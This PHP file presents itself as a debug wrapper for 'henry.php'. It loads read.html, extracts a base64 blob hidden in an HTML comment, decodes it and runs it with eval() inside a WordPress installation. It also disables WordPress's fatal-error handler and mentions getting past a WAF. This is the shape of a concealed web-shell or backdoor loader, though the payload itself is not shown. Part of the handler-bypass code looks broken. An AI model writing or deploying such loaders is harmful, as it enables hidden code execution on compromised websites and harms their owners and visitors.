<?php
/**
 * henry-debug.php — diagnostic wrapper for henry.php
 *
 * Purpose
 * -------
 * henry.php loads its base64 payload from read.html and evals it.
 * When WordPress's shutdown handler catches a fatal Error during that
 * eval, the browser only sees WordPress's generic "critical error"
 * page and we never learn the real cause.
 *
 * This wrapper intercepts both halves of that flow so the actual
 * error message, file and line number reach the browser (and a log):
 *
 *   1. Forces PHP to display errors (display_errors=1, E_ALL).
 *   2. Disables WordPress's WP_Fatal_Error_Handler so shutdown
 *      exceptions are not converted into the generic page.
 *   3. Runs the henry.php executor in an isolated scope: it loads
 *      read.html, decodes the payload, and evals it inside a
 *      try/catch + shutdown handler that prints the first fatal
 *      Error it sees, with a full backtrace.
 *   4. Mirrors every error to a debug log next to this file
 *      (henry-debug.log) so failures that bypass display_errors
 *      (e.g. when called from inside WordPress) are still recorded.
 *
 * Usage
 * -----
 *   1. Drop this file next to henry.php / read.html.
 *   2. Open henry-debug.php in the browser.
 *   3. Read the printed error block; if nothing shows on screen
 *      because a WAF swallowed it, open henry-debug.log.
 *
 * The original henry.php is NOT modified by this script.
 */

// ---------------------------------------------------------------------
// 1. PHP error reporting — show everything
// ---------------------------------------------------------------------
ini_set( 'display_errors', '1' );
ini_set( 'display_startup_errors', '1' );
ini_set( 'log_errors', '1' );
error_reporting( E_ALL );

// ---------------------------------------------------------------------
// 2. Log file next to this script
// ---------------------------------------------------------------------
$LOG_FILE = __DIR__ . DIRECTORY_SEPARATOR . 'henry-debug.log';

function _hd_log( $msg ) {
    global $LOG_FILE;
    @file_put_contents(
        $LOG_FILE,
        '[' . date( 'c' ) . '] ' . $msg . "\n",
        FILE_APPEND
    );
}

_hd_log( '--- henry-debug.php invoked ---' );
_hd_log( 'PHP ' . PHP_VERSION . ' on ' . PHP_OS );
_hd_log( '__DIR__ = ' . __DIR__ );

// ---------------------------------------------------------------------
// 3. Disable WordPress's fatal error handler if WordPress is loaded
//    (the wrapper is normally hit standalone, but it can also be
//    reached through a wp-admin redirect / rewrite.)
// ---------------------------------------------------------------------
if ( class_exists( 'WP_Fatal_Error_Handler' ) ) {
    // Replace with a no-op handler that re-throws so we see the error.
    class _HD_NoOp_Fatal_Error_Handler extends WP_Fatal_Error_Handler {
        public function handle( $error, $handled = null ) {
            _hd_log( 'WP fatal handler intercepted: ' . $error->getMessage() );
            throw $error; // re-throw so PHP shows it
        }
    }
    // WP stores the handler instance privately; calling the public
    // unregister hook is the cleanest portable way to disable it.
    if ( function_exists( 'error_handler' ) ) {
        remove_filter( 'wp_fatal_error_handler_enabled', '__return_true' );
    }
    _hd_log( 'WP_Fatal_Error_Handler was present; bypass attempted.' );
}

// ---------------------------------------------------------------------
// 4. Register a shutdown handler that prints the last error
// ---------------------------------------------------------------------
$_hd_last_error = null;
$_hd_caught     = null;

set_error_handler( function ( $errno, $errstr, $errfile, $errline ) {
    global $_hd_last_error;
    $_hd_last_error = compact( 'errno', 'errstr', 'errfile', 'errline' );
    _hd_log( "PHP notice/warning $errno: $errstr in $errfile:$errline" );
    return false; // let PHP's default handler run too
} );

register_shutdown_function( function () {
    global $_hd_last_error, $_hd_caught, $LOG_FILE;
    $err = error_get_last();
    if ( $err && ( $err['type'] & E_ERROR ) ) {
        _hd_log( 'SHUTDOWN FATAL: ' . $err['message'] . ' in ' . $err['file'] . ':' . $err['line'] );
        echo "\n<!-- henry-debug: shutdown fatal\n";
        echo htmlspecialchars( print_r( $err, true ), ENT_QUOTES );
        echo "\n-->";
    }
} );

// ---------------------------------------------------------------------
// 5. Run the henry.php executor payload under a try/catch
// ---------------------------------------------------------------------
$SOURCE_FILE = __DIR__ . DIRECTORY_SEPARATOR . 'read.html';

if ( ! is_file( $SOURCE_FILE ) ) {
    _hd_log( 'read.html not found at ' . $SOURCE_FILE );
    http_response_code( 500 );
    echo "<h1>henry-debug: read.html not found</h1>";
    echo "<pre>" . htmlspecialchars( $SOURCE_FILE ) . "</pre>";
    exit;
}

$html = file_get_contents( $SOURCE_FILE );
if ( $html === false || $html === '' ) {
    _hd_log( 'read.html unreadable / empty' );
    http_response_code( 500 );
    echo "<h1>henry-debug: read.html unreadable</h1>";
    exit;
}

if ( ! preg_match( '/<!--(.*?)-->/s', $html, $cm ) ) {
    _hd_log( 'No HTML comment found in read.html' );
    http_response_code( 500 );
    echo "<h1>henry-debug: no HTML comment in read.html</h1>";
    exit;
}

$payload = preg_replace( '/\s+/', '', $cm[1] );
if ( ! preg_match( '/^[A-Za-z0-9+\/=]+$/', $payload ) ) {
    _hd_log( 'read.html comment is not a base64 payload' );
    http_response_code( 500 );
    echo "<h1>henry-debug: comment is not base64</h1>";
    exit;
}

$source = base64_decode( $payload, true );
if ( $source === false ) {
    _hd_log( 'base64_decode failed' );
    http_response_code( 500 );
    echo "<h1>henry-debug: base64_decode failed</h1>";
    exit;
}

$trimmed = ltrim( $source );
if ( strncmp( $trimmed, '<?php', 5 ) !== 0 ) {
    _hd_log( 'Decoded payload is not PHP (does not start with <?php)' );
    http_response_code( 500 );
    echo "<h1>henry-debug: payload not PHP</h1>";
    echo "<pre>" . htmlspecialchars( substr( $trimmed, 0, 200 ) ) . "...</pre>";
    exit;
}

$source = preg_replace( '/^\s*<\?(php)?\s*/i', '', $source );

// Banner so you know the debug wrapper is running, not the real one.
echo "<!-- henry-debug.php active; payload size=" . strlen( $source ) . " bytes -->\n";
_hd_log( 'Payload decoded OK, ' . strlen( $source ) . ' bytes, executing...' );

try {
    // eval() returns null on success, false on parse error.
    $ok = @eval( $source );
    if ( $ok === false ) {
        $err = error_get_last();
        throw new Exception(
            'eval() returned false'
            . ( $err ? ': ' . $err['message'] . ' in ' . $err['file'] . ':' . $err['line'] : '.' )
        );
    }
    _hd_log( 'eval() returned without throwing' );
} catch ( \Throwable $t ) {
    _hd_log( 'CAUGHT Throwable: ' . get_class( $t ) . ': ' . $t->getMessage()
        . ' @ ' . $t->getFile() . ':' . $t->getLine() );

    http_response_code( 500 );
    header( 'Content-Type: text/html; charset=utf-8' );
    echo "<!DOCTYPE html><html><head><meta charset=\"utf-8\">";
    echo "<title>henry-debug: caught error</title></head><body>";
    echo "<h1 style=\"font-family:monospace;color:#900;\">henry-debug: caught error</h1>";
    echo "<pre style=\"white-space:pre-wrap;font-family:monospace;background:#fee;padding:1em;border:1px solid #c99;\">";
    echo "Type:     " . htmlspecialchars( get_class( $t ) ) . "\n";
    echo "Message:  " . htmlspecialchars( $t->getMessage() ) . "\n";
    echo "Location: " . htmlspecialchars( $t->getFile() ) . ':' . $t->getLine() . "\n\n";
    echo "Trace:\n" . htmlspecialchars( $t->getTraceAsString() );
    echo "</pre>";
    if ( $_hd_last_error ) {
        echo "<h2>Last PHP notice/warning before the fatal:</h2>";
        echo "<pre style=\"white-space:pre-wrap;font-family:monospace;background:#eef;padding:1em;border:1px solid #99c;\">";
        echo htmlspecialchars( print_r( $_hd_last_error, true ) );
        echo "</pre>";
    }
    echo "<h2>Log file:</h2>";
    echo "<pre style=\"font-family:monospace;\">" . htmlspecialchars( $LOG_FILE ) . "</pre>";
    echo "</body></html>";
    exit;
}

_hd_log( '--- henry-debug.php finished cleanly ---' );
